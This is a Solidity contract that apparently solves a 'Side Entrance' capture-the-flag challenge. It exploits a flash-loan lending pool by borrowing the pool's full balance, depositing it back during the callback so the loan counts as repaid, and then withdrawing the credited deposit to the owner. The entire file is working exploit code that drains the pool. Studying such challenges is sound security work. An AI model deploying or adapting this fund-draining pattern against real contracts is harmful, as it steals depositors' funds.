// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";



contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external override payable {
        require(msg.sender == address(pool), "only pool");
        // receive flash loan and call pool.deposit depositing the loaned amount
        pool.deposit{value: msg.value}();
    }
    function attack() external{
         require(msg.sender == owner, "only owner");
         uint256 PoolBalance = address(pool).balance;
         pool.flashLoan(PoolBalance);

         pool.withdraw();

         payable(owner).transfer(address(this).balance);
    }

    receive () external payable {}
}